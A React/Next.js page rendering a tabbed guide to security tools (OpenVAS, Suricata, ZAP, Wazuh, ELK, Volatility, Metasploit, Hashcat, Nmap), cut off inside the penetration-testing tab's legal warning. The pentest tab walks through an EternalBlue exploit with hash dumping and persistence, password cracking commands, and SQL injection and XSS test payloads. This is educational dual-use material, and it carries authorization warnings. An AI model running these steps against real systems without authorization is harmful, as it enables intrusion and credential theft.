"use client"

import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { CodeBlock } from "@/components/code-block"
import { AlertTriangle, Terminal, Shield, Globe, Search, Activity, FileSearch, Code, Zap } from "lucide-react"

export default function ToolsPage() {
  return (
    <div className="container mx-auto py-8 px-4">
      <h1 className="text-4xl font-bold mb-6">🛠️ Security Tools</h1>
      <p className="text-lg mb-8">
        Security tools are essential for identifying vulnerabilities, detecting threats, and responding to security
        incidents. This guide covers the most important security tools across different domains, with practical examples
        and use cases.
      </p>

      <Tabs defaultValue="vulnerability">
        <TabsList className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 mb-8">
          <TabsTrigger value="vulnerability">
            <Search className="h-4 w-4 mr-2" />
            Vulnerability Management
          </TabsTrigger>
          <TabsTrigger value="network">
            <Globe className="h-4 w-4 mr-2" />
            Network Security
          </TabsTrigger>
          <TabsTrigger value="web">
            <Shield className="h-4 w-4 mr-2" />
            Web Application
          </TabsTrigger>
          <TabsTrigger value="endpoint">
            <Terminal className="h-4 w-4 mr-2" />
            Endpoint Security
          </TabsTrigger>
          <TabsTrigger value="siem">
            <Activity className="h-4 w-4 mr-2" />
            SIEM & Monitoring
          </TabsTrigger>
          <TabsTrigger value="forensics">
            <FileSearch className="h-4 w-4 mr-2" />
            Forensics & IR
          </TabsTrigger>
          <TabsTrigger value="pentest">
            <Zap className="h-4 w-4 mr-2" />
            Penetration Testing
          </TabsTrigger>
          <TabsTrigger value="automation">
            <Code className="h-4 w-4 mr-2" />
            Security Automation
          </TabsTrigger>
        </TabsList>

        {/* Vulnerability Management Tools */}
        <TabsContent value="vulnerability" className="space-y-6">
          <h2 className="text-3xl font-bold mb-4">Vulnerability Management Tools</h2>
          <p className="mb-4">
            Vulnerability management tools help identify, classify, prioritize, and remediate security vulnerabilities
            across your infrastructure.
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">Nessus</h3>
              <p className="mb-3">
                Commercial vulnerability scanner with extensive capabilities for identifying vulnerabilities across
                networks, operating systems, and applications.
              </p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Comprehensive vulnerability database</li>
                <li>Configurable scanning policies</li>
                <li>Compliance auditing</li>
                <li>Detailed remediation information</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Enterprise vulnerability management with detailed reporting and compliance checks.</p>
            </div>

            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">OpenVAS</h3>
              <p className="mb-3">
                Open-source vulnerability scanner that provides a comprehensive set of vulnerability tests.
              </p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Free and open-source</li>
                <li>Regular vulnerability feed updates</li>
                <li>Web-based interface (via Greenbone Security Assistant)</li>
                <li>Scheduling and reporting capabilities</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Cost-effective vulnerability scanning for small to medium organizations.</p>
            </div>
          </div>

          <h3 className="text-2xl font-bold mb-4">Running a Vulnerability Scan with OpenVAS</h3>
          <CodeBlock
            language="bash"
            code={`# Install OpenVAS on Ubuntu
sudo apt update
sudo apt install openvas

# Initialize OpenVAS
sudo gvm-setup

# Create a new admin user
sudo gvmd --create-user=admin --password=secure_password

# Start the scanner
sudo gvm-start

# Access the web interface at https://localhost:9392
# Create a new target and task through the web interface`}
          />

          <h3 className="text-2xl font-bold mb-4">Vulnerability Management Best Practices</h3>
          <ul className="list-disc pl-5 mb-6 space-y-2">
            <li>
              <strong>Regular Scanning:</strong> Schedule automated scans at least monthly, with more frequent scans for
              critical systems.
            </li>
            <li>
              <strong>Risk-Based Prioritization:</strong> Focus on vulnerabilities that pose the highest risk based on
              CVSS scores, asset value, and exploitability.
            </li>
            <li>
              <strong>Patch Management:</strong> Establish a systematic approach to applying security patches based on
              criticality.
            </li>
            <li>
              <strong>Baseline Configuration:</strong> Maintain secure baseline configurations to reduce the attack
              surface.
            </li>
            <li>
              <strong>Continuous Monitoring:</strong> Implement continuous vulnerability monitoring for critical
              systems.
            </li>
          </ul>

          <Alert>
            <AlertTriangle className="h-4 w-4" />
            <AlertTitle>Important Consideration</AlertTitle>
            <AlertDescription>
              Always obtain proper authorization before scanning systems. Unauthorized vulnerability scanning may be
              illegal and can cause system disruptions.
            </AlertDescription>
          </Alert>
        </TabsContent>

        {/* Network Security Tools */}
        <TabsContent value="network" className="space-y-6">
          <h2 className="text-3xl font-bold mb-4">Network Security Tools</h2>
          <p className="mb-4">
            Network security tools help monitor, analyze, and protect network infrastructure from unauthorized access
            and attacks.
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">Wireshark</h3>
              <p className="mb-3">
                The world&apos;s foremost network protocol analyzer for network troubleshooting and analysis.
              </p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Deep inspection of hundreds of protocols</li>
                <li>Live capture and offline analysis</li>
                <li>Multi-platform support</li>
                <li>Powerful display filters</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Network troubleshooting, protocol analysis, and security investigation.</p>
            </div>

            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">Suricata</h3>
              <p className="mb-3">High-performance Network IDS, IPS, and Network Security Monitoring engine.</p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Multi-threaded engine for high performance</li>
                <li>Automatic protocol detection</li>
                <li>File extraction and logging</li>
                <li>TLS/SSL certificate monitoring</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Real-time intrusion detection and prevention in high-speed networks.</p>
            </div>
          </div>

          <h3 className="text-2xl font-bold mb-4">Capturing and Analyzing Network Traffic with Wireshark</h3>
          <CodeBlock
            language="bash"
            code={`# Start Wireshark from command line with specific interface
wireshark -i eth0 -k

# Using display filters to find specific traffic
# HTTP traffic
http

# Traffic to/from specific IP
ip.addr == 192.168.1.100

# DNS queries
dns.qry.name contains "example.com"

# Suspicious TLS certificates
tls.handshake.certificate and x509sat.uTF8String contains "suspicious"

# Export specific packets to a new file
# Use File > Export Specified Packets in the GUI`}
          />

          <h3 className="text-2xl font-bold mb-4">Setting Up Suricata IDS</h3>
          <CodeBlock
            language="bash"
            code={`# Install Suricata on Ubuntu
sudo apt update
sudo apt install suricata

# Update Suricata rules
sudo suricata-update

# Edit configuration
sudo nano /etc/suricata/suricata.yaml
# Set HOME_NET to your network range
# Configure interfaces and rule paths

# Start Suricata in IDS mode
sudo suricata -c /etc/suricata/suricata.yaml -i eth0

# View alerts
tail -f /var/log/suricata/fast.log`}
          />

          <h3 className="text-2xl font-bold mb-4">Network Security Monitoring Best Practices</h3>
          <ul className="list-disc pl-5 mb-6 space-y-2">
            <li>
              <strong>Strategic Sensor Placement:</strong> Deploy sensors at network boundaries and critical internal
              segments.
            </li>
            <li>
              <strong>Baseline Normal Traffic:</strong> Understand what normal network traffic looks like to identify
              anomalies.
            </li>
            <li>
              <strong>Regular Rule Updates:</strong> Keep IDS/IPS signatures and rules updated to detect the latest
              threats.
            </li>
            <li>
              <strong>Tune False Positives:</strong> Regularly review and tune rules to reduce false positives while
              maintaining detection capabilities.
            </li>
            <li>
              <strong>Encrypted Traffic Analysis:</strong> Implement solutions for monitoring encrypted traffic without
              compromising privacy.
            </li>
          </ul>

          <Alert>
            <AlertTriangle className="h-4 w-4" />
            <AlertTitle>Privacy Consideration</AlertTitle>
            <AlertDescription>
              Network monitoring may capture sensitive data. Ensure compliance with privacy regulations and company
              policies when implementing monitoring solutions.
            </AlertDescription>
          </Alert>
        </TabsContent>

        {/* Web Application Security Tools */}
        <TabsContent value="web" className="space-y-6">
          <h2 className="text-3xl font-bold mb-4">Web Application Security Tools</h2>
          <p className="mb-4">
            Web application security tools help identify and mitigate vulnerabilities specific to web applications, such
            as SQL injection, XSS, and CSRF.
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">OWASP ZAP</h3>
              <p className="mb-3">Free and open-source web application security scanner maintained by OWASP.</p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Automated scanner</li>
                <li>Intercepting proxy</li>
                <li>Spider for crawling applications</li>
                <li>REST API for integration</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Automated and manual security testing of web applications during development and testing phases.</p>
            </div>

            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">Burp Suite</h3>
              <p className="mb-3">
                Integrated platform for performing security testing of web applications with both free and commercial
                versions.
              </p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Intercepting proxy</li>
                <li>Advanced scanner (Pro version)</li>
                <li>Intruder for automated attacks</li>
                <li>Extensible with plugins</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Professional web application penetration testing and security assessments.</p>
            </div>
          </div>

          <h3 className="text-2xl font-bold mb-4">Using OWASP ZAP for Web Application Scanning</h3>
          <CodeBlock
            language="bash"
            code={`# Start ZAP from command line
zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.disablekey=true

# Run an automated scan using the API
curl "http://localhost:8080/JSON/ascan/action/scan/?url=https://example.com&recurse=true&inScopeOnly=false&scanPolicyName=&method=&postData=&contextId="

# Generate a report
curl "http://localhost:8080/OTHER/core/other/jsonreport/?formMethod=GET" > zap-report.json

# Using ZAP in a CI/CD pipeline with Docker
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://example.com -g gen.conf -r report.html`}
          />

          <h3 className="text-2xl font-bold mb-4">Using Burp Suite for Manual Testing</h3>
          <CodeBlock
            language="bash"
            code={`# Start Burp Suite
java -jar burpsuite_community.jar

# Configure your browser to use Burp as a proxy (typically 127.0.0.1:8080)

# Common Burp Suite workflow:
# 1. Navigate through the application with Proxy intercept on
# 2. Review the site map in Target tab
# 3. Send interesting requests to Repeater for manipulation
# 4. Use Intruder for parameter fuzzing
# 5. Check for common vulnerabilities:
#    - SQL Injection: ' OR 1=1--
#    - XSS: <script>alert(1)</script>
#    - CSRF: Check for missing tokens
#    - Insecure direct object references: Manipulate IDs`}
          />

          <h3 className="text-2xl font-bold mb-4">Web Application Security Best Practices</h3>
          <ul className="list-disc pl-5 mb-6 space-y-2">
            <li>
              <strong>Shift Left Security:</strong> Integrate security testing early in the development lifecycle.
            </li>
            <li>
              <strong>Regular Testing:</strong> Perform both automated and manual security testing regularly, especially
              after significant changes.
            </li>
            <li>
              <strong>Follow OWASP Guidelines:</strong> Address the OWASP Top 10 vulnerabilities as a minimum baseline.
            </li>
            <li>
              <strong>Input Validation:</strong> Implement proper input validation on both client and server sides.
            </li>
            <li>
              <strong>Content Security Policy:</strong> Implement CSP headers to mitigate XSS attacks.
            </li>
            <li>
              <strong>API Security:</strong> Apply the same security controls to APIs as to web applications.
            </li>
          </ul>

          <Alert>
            <AlertTriangle className="h-4 w-4" />
            <AlertTitle>Testing Authorization</AlertTitle>
            <AlertDescription>
              Always obtain explicit permission before testing web applications. Testing without authorization may
              violate computer crime laws and terms of service.
            </AlertDescription>
          </Alert>
        </TabsContent>

        {/* Endpoint Security Tools */}
        <TabsContent value="endpoint" className="space-y-6">
          <h2 className="text-3xl font-bold mb-4">Endpoint Security Tools</h2>
          <p className="mb-4">
            Endpoint security tools protect individual devices (endpoints) from malware, unauthorized access, and other
            threats.
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">OSSEC</h3>
              <p className="mb-3">
                Open-source host-based intrusion detection system (HIDS) that performs log analysis, integrity checking,
                and rootkit detection.
              </p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>File integrity monitoring</li>
                <li>Log monitoring and analysis</li>
                <li>Rootkit detection</li>
                <li>Active response capabilities</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Monitoring system integrity and detecting unauthorized changes across servers and workstations.</p>
            </div>

            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">Wazuh</h3>
              <p className="mb-3">
                Free and open-source platform for threat detection, security monitoring, and incident response.
              </p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Security analytics</li>
                <li>Intrusion detection</li>
                <li>Log data analysis</li>
                <li>Compliance monitoring</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Comprehensive security monitoring and threat hunting across endpoints and servers.</p>
            </div>
          </div>

          <h3 className="text-2xl font-bold mb-4">Setting Up OSSEC HIDS</h3>
          <CodeBlock
            language="bash"
            code={`# Install OSSEC on Ubuntu
wget https://github.com/ossec/ossec-hids/archive/3.6.0.tar.gz
tar -xzf 3.6.0.tar.gz
cd ossec-hids-3.6.0
sudo ./install.sh

# During installation, choose:
# - Local installation for single system
# - Server installation for central monitoring
# - Agent installation for monitored endpoints

# Start OSSEC
sudo /var/ossec/bin/ossec-control start

# Check status
sudo /var/ossec/bin/ossec-control status

# Add a file to monitor
echo "/etc/passwd" >> /var/ossec/etc/ossec.conf
sudo /var/ossec/bin/ossec-control restart`}
          />

          <h3 className="text-2xl font-bold mb-4">Deploying Wazuh</h3>
          <CodeBlock
            language="bash"
            code={`# Install Wazuh server using Docker
git clone https://github.com/wazuh/wazuh-docker.git
cd wazuh-docker/single-node
docker-compose up -d

# Install Wazuh agent on Ubuntu endpoint
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/sources.list.d/wazuh.list
apt-get update
apt-get install wazuh-agent

# Configure agent to connect to Wazuh server
sed -i "s/MANAGER_IP/your-wazuh-server-ip/" /var/ossec/etc/ossec.conf

# Start the agent
systemctl start wazuh-agent
systemctl enable wazuh-agent

# Access the Wazuh dashboard at https://your-wazuh-server-ip`}
          />

          <h3 className="text-2xl font-bold mb-4">Endpoint Security Best Practices</h3>
          <ul className="list-disc pl-5 mb-6 space-y-2">
            <li>
              <strong>Defense in Depth:</strong> Implement multiple layers of security controls on endpoints.
            </li>
            <li>
              <strong>Least Privilege:</strong> Restrict user permissions to only what&apos;s necessary for their role.
            </li>
            <li>
              <strong>Application Whitelisting:</strong> Allow only approved applications to run on endpoints.
            </li>
            <li>
              <strong>Regular Updates:</strong> Keep operating systems and applications patched and updated.
            </li>
            <li>
              <strong>Endpoint Encryption:</strong> Implement full-disk encryption to protect data at rest.
            </li>
            <li>
              <strong>Centralized Management:</strong> Use centralized management for consistent policy enforcement.
            </li>
          </ul>

          <Alert>
            <AlertTriangle className="h-4 w-4" />
            <AlertTitle>Performance Impact</AlertTitle>
            <AlertDescription>
              Endpoint security tools can impact system performance. Test thoroughly before deploying to production
              environments and balance security needs with performance requirements.
            </AlertDescription>
          </Alert>
        </TabsContent>

        {/* SIEM & Monitoring Tools */}
        <TabsContent value="siem" className="space-y-6">
          <h2 className="text-3xl font-bold mb-4">SIEM & Monitoring Tools</h2>
          <p className="mb-4">
            Security Information and Event Management (SIEM) tools collect, analyze, and correlate security events from
            various sources to detect threats and support incident response.
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">ELK Stack</h3>
              <p className="mb-3">
                Elasticsearch, Logstash, and Kibana combined to create a powerful log management and analytics platform.
              </p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Scalable log collection and storage</li>
                <li>Powerful search capabilities</li>
                <li>Customizable dashboards</li>
                <li>Real-time analytics</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Centralized logging, security monitoring, and visualization for organizations of all sizes.</p>
            </div>

            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">Graylog</h3>
              <p className="mb-3">
                Open-source log management platform designed for collecting, indexing, and analyzing machine data.
              </p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Centralized log management</li>
                <li>Alerting capabilities</li>
                <li>Role-based access control</li>
                <li>Extensible architecture</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Log collection and analysis with a focus on security monitoring and compliance.</p>
            </div>
          </div>

          <h3 className="text-2xl font-bold mb-4">Setting Up ELK Stack with Docker</h3>
          <CodeBlock
            language="yaml"
            code={`# docker-compose.yml for ELK Stack
version: '3'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:7.14.0
    environment:
      - discovery.type=single-node
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
    ports:
      - "9200:9200"
    volumes:
      - elasticsearch_data:/usr/share/elasticsearch/data
    
  logstash:
    image: docker.elastic.co/logstash/logstash:7.14.0
    volumes:
      - ./logstash/pipeline:/usr/share/logstash/pipeline
    ports:
      - "5044:5044"
    depends_on:
      - elasticsearch
      
  kibana:
    image: docker.elastic.co/kibana/kibana:7.14.0
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch

volumes:
  elasticsearch_data:`}
          />

          <h3 className="text-2xl font-bold mb-4">Basic Logstash Configuration for Security Logs</h3>
          <CodeBlock
            language="conf"
            code={`# logstash/pipeline/security.conf
input {
  beats {
    port => 5044
  }
  
  syslog {
    port => 5140
    type => "syslog"
  }
}

filter {
  if [type] == "syslog" {
    grok {
      match => { "message" => "%{SYSLOGTIMESTAMP:syslog_timestamp} %{SYSLOGHOST:syslog_hostname} %{DATA:syslog_program}(?:\\[%{POSINT:syslog_pid}\\])?: %{GREEDYDATA:syslog_message}" }
    }
    
    # Extract authentication failures
    if [syslog_program] == "sshd" {
      grok {
        match => { "syslog_message" => "Failed password for %{USERNAME:username} from %{IP:src_ip}" }
      }
    }
    
    # Add severity for failed logins
    if [username] and [src_ip] {
      mutate {
        add_field => { "severity" => "high" }
        add_field => { "event_type" => "authentication_failure" }
      }
    }
  }
}

output {
  elasticsearch {
    hosts => ["elasticsearch:9200"]
    index => "security-logs-%{+YYYY.MM.dd}"
  }
}`}
          />

          <h3 className="text-2xl font-bold mb-4">Creating a Security Dashboard in Kibana</h3>
          <p className="mb-4">After setting up ELK Stack, follow these steps to create a security dashboard:</p>
          <ol className="list-decimal pl-5 mb-6 space-y-2">
            <li>Access Kibana at http://localhost:5601</li>
            <li>Go to Stack Management {'>'} Index Patterns and create a pattern for your security logs</li>
            <li>Navigate to Dashboard and create a new dashboard</li>
            <li>
              Add visualizations for:
              <ul className="list-disc pl-5 mt-2">
                <li>Authentication failures by source IP (Bar chart)</li>
                <li>Authentication failures over time (Line chart)</li>
                <li>Top usernames targeted (Pie chart)</li>
                <li>Geographic map of attack sources (Coordinate map)</li>
                <li>Recent security events (Data table)</li>
              </ul>
            </li>
            <li>Save the dashboard and set up automated refresh</li>
          </ol>

          <h3 className="text-2xl font-bold mb-4">SIEM Best Practices</h3>
          <ul className="list-disc pl-5 mb-6 space-y-2">
            <li>
              <strong>Log Everything Important:</strong> Collect logs from all critical systems and security devices.
            </li>
            <li>
              <strong>Normalize Data:</strong> Standardize log formats to enable effective correlation.
            </li>
            <li>
              <strong>Establish Baselines:</strong> Understand normal behavior to better detect anomalies.
            </li>
            <li>
              <strong>Correlation Rules:</strong> Develop and tune correlation rules to identify complex attack
              patterns.
            </li>
            <li>
              <strong>Retention Policy:</strong> Define appropriate log retention periods based on compliance
              requirements.
            </li>
            <li>
              <strong>Regular Review:</strong> Schedule regular reviews of alerts and dashboards to identify
              improvements.
            </li>
          </ul>

          <Alert>
            <AlertTriangle className="h-4 w-4" />
            <AlertTitle>Resource Requirements</AlertTitle>
            <AlertDescription>
              SIEM solutions can require significant storage and processing resources. Plan your infrastructure
              accordingly and consider log volume growth over time.
            </AlertDescription>
          </Alert>
        </TabsContent>

        {/* Forensics & Incident Response Tools */}
        <TabsContent value="forensics" className="space-y-6">
          <h2 className="text-3xl font-bold mb-4">Forensics & Incident Response Tools</h2>
          <p className="mb-4">
            Digital forensics and incident response (DFIR) tools help investigate security incidents, collect evidence,
            and analyze compromised systems.
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">Volatility</h3>
              <p className="mb-3">Advanced memory forensics framework for incident response and malware analysis.</p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Memory dump analysis</li>
                <li>Process examination</li>
                <li>Network connection analysis</li>
                <li>Malware detection</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Analyzing memory dumps to detect and investigate advanced threats and malware.</p>
            </div>

            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">The Sleuth Kit & Autopsy</h3>
              <p className="mb-3">
                Collection of command line tools and a graphical interface for disk image forensic analysis.
              </p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>File system analysis</li>
                <li>Timeline creation</li>
                <li>File recovery</li>
                <li>Keyword searching</li>
                <li>Hash analysis</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Forensic investigation of disk images to recover evidence and analyze digital artifacts.</p>
            </div>
          </div>

          <h3 className="text-2xl font-bold mb-4">Memory Analysis with Volatility</h3>
          <CodeBlock
            language="bash"
            code={`# Install Volatility 3
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
pip install -e .

# List available plugins
python vol.py -h

# Identify the operating system profile
python vol.py -f memory_dump.raw windows.info

# List running processes
python vol.py -f memory_dump.raw windows.pslist

# Check network connections
python vol.py -f memory_dump.raw windows.netscan

# Scan for malware indicators
python vol.py -f memory_dump.raw windows.malfind

# Dump a suspicious process for further analysis
python vol.py -f memory_dump.raw windows.dumpfiles --pid 1234`}
          />

          <h3 className="text-2xl font-bold mb-4">Disk Forensics with Autopsy</h3>
          <p className="mb-4">
            Autopsy provides a graphical interface for The Sleuth Kit and other digital forensics tools:
          </p>
          <ol className="list-decimal pl-5 mb-6 space-y-2">
            <li>Create a new case in Autopsy</li>
            <li>Add the disk image as a data source</li>
            <li>
              Let Autopsy run ingest modules:
              <ul className="list-disc pl-5 mt-2">
                <li>Hash analysis</li>
                <li>Keyword search</li>
                <li>Web artifacts</li>
                <li>EXIF extraction</li>
              </ul>
            </li>
            <li>Analyze the timeline of events</li>
            <li>Search for specific files or keywords</li>
            <li>Export findings for reporting</li>
          </ol>

          <h3 className="text-2xl font-bold mb-4">Creating a Basic Incident Response Toolkit</h3>
          <CodeBlock
            language="bash"
            code={`# Create a bootable USB with essential IR tools
# Start with a Linux distribution like SANS SIFT or Kali

# Essential tools to include:
# - Memory acquisition: LiME, FTK Imager
# - Disk imaging: dd, dcfldd
# - Live response: SANS IR scripts
# - Network analysis: tcpdump, Wireshark
# - Timeline creation: log2timeline/plaso
# - Hash verification: md5sum, sha256sum

# Example script to collect volatile data
#!/bin/bash
# IR data collection script

OUTPUT_DIR="/evidence/$(hostname)_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

echo "Collecting system information..."
hostname > $OUTPUT_DIR/hostname.txt
date > $OUTPUT_DIR/date_time.txt
uname -a > $OUTPUT_DIR/kernel.txt

echo "Collecting running processes..."
ps aux > $OUTPUT_DIR/processes.txt
lsof > $OUTPUT_DIR/open_files.txt

echo "Collecting network information..."
netstat -antup > $OUTPUT_DIR/network_connections.txt
ifconfig -a > $OUTPUT_DIR/network_interfaces.txt

echo "Collecting logged in users..."
who > $OUTPUT_DIR/logged_users.txt
last > $OUTPUT_DIR/login_history.txt

echo "Collecting system logs..."
cp /var/log/auth.log $OUTPUT_DIR/
cp /var/log/syslog $OUTPUT_DIR/

echo "Collection complete: $OUTPUT_DIR"`}
          />

          <h3 className="text-2xl font-bold mb-4">Forensics & Incident Response Best Practices</h3>
          <ul className="list-disc pl-5 mb-6 space-y-2">
            <li>
              <strong>Preserve Evidence:</strong> Always work with copies of evidence, never the originals.
            </li>
            <li>
              <strong>Maintain Chain of Custody:</strong> Document who handled the evidence, when, and why.
            </li>
            <li>
              <strong>Order of Volatility:</strong> Collect the most volatile data first (memory, network connections,
              running processes).
            </li>
            <li>
              <strong>Document Everything:</strong> Take detailed notes of all actions performed during the
              investigation.
            </li>
            <li>
              <strong>Use Write Blockers:</strong> Prevent accidental modification of evidence when analyzing storage
              media.
            </li>
            <li>
              <strong>Timeline Analysis:</strong> Create a comprehensive timeline of events to understand the incident.
            </li>
          </ul>

          <Alert>
            <AlertTriangle className="h-4 w-4" />
            <AlertTitle>Legal Considerations</AlertTitle>
            <AlertDescription>
              Digital forensics may have legal implications. Ensure you understand the legal requirements and
              limitations in your jurisdiction before conducting forensic investigations.
            </AlertDescription>
          </Alert>
        </TabsContent>

        {/* Penetration Testing Tools */}
        <TabsContent value="pentest" className="space-y-6">
          <h2 className="text-3xl font-bold mb-4">Penetration Testing Tools</h2>
          <p className="mb-4">
            Penetration testing tools help security professionals simulate attacks to identify vulnerabilities before
            malicious actors can exploit them.
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">Metasploit Framework</h3>
              <p className="mb-3">
                Comprehensive penetration testing framework that provides a complete environment for exploit development
                and execution.
              </p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Extensive exploit database</li>
                <li>Post-exploitation modules</li>
                <li>Payload generation</li>
                <li>Auxiliary scanning tools</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Comprehensive penetration testing across networks, applications, and systems.</p>
            </div>

            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">Hashcat</h3>
              <p className="mb-3">
                Advanced password recovery utility that supports various hashing algorithms and attack methods.
              </p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>GPU acceleration</li>
                <li>Multiple attack modes</li>
                <li>Support for numerous hash types</li>
                <li>Rule-based attacks</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Password auditing and recovery during penetration tests to assess password strength.</p>
            </div>
          </div>

          <h3 className="text-2xl font-bold mb-4">Using Metasploit for Vulnerability Exploitation</h3>
          <CodeBlock
            language="bash"
            code={`# Start Metasploit console
msfconsole

# Search for exploits
search type:exploit platform:windows ms17-010

# Use a specific exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set required options
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10

# Check if the target is vulnerable
check

# Run the exploit
exploit

# Post-exploitation: Dump hashes
run post/windows/gather/hashdump

# Establish persistence
run post/windows/manage/persistence_exe

# Clean up
sessions -K`}
          />

          <h3 className="text-2xl font-bold mb-4">Password Cracking with Hashcat</h3>
          <CodeBlock
            language="bash"
            code={`# Basic dictionary attack on MD5 hashes
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Dictionary attack with rules on NTLM hashes
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# Brute force attack on SHA-256 hashes (8 chars, lowercase only)
hashcat -m 1400 -a 3 hashes.txt ?l?l?l?l?l?l?l?l

# Mask attack on WPA/WPA2 hashes (8 digits)
hashcat -m 22000 -a 3 capture.hccapx ?d?d?d?d?d?d?d?d

# Show cracked passwords
hashcat -m 0 hashes.txt --show

# Benchmark performance
hashcat -b`}
          />

          <h3 className="text-2xl font-bold mb-4">Network Reconnaissance with Nmap</h3>
          <CodeBlock
            language="bash"
            code={`# Basic scan
nmap 192.168.1.0/24

# Comprehensive scan with OS and version detection
nmap -A 192.168.1.0/24

# Stealth scan
nmap -sS 192.168.1.0/24

# Scan specific ports
nmap -p 22,80,443 192.168.1.0/24

# Vulnerability scanning with NSE scripts
nmap --script vuln 192.168.1.100

# Save results to file
nmap -A 192.168.1.0/24 -oX scan_results.xml`}
          />

          <h3 className="text-2xl font-bold mb-4">Penetration Testing Best Practices</h3>
          <ul className="list-disc pl-5 mb-6 space-y-2">
            <li>
              <strong>Proper Authorization:</strong> Always obtain explicit written permission before conducting
              penetration tests.
            </li>
            <li>
              <strong>Define Scope:</strong> Clearly define the scope, including systems to test and techniques to use
              or avoid.
            </li>
            <li>
              <strong>Minimize Impact:</strong> Use techniques that minimize the risk of system disruption or data loss.
            </li>
            <li>
              <strong>Document Findings:</strong> Maintain detailed records of all activities, findings, and
              recommendations.
            </li>
            <li>
              <strong>Secure Testing Environment:</strong> Ensure tools and findings are secured to prevent unauthorized
              access.
            </li>
            <li>
              <strong>Follow Methodology:</strong> Use established methodologies like PTES or OSSTMM to ensure
              comprehensive testing.
            </li>
          </ul>

          <Alert>
            <AlertTriangle className="h-4 w-4" />
            <AlertTitle>Legal Warning</AlertTitle>
            <AlertDescription>
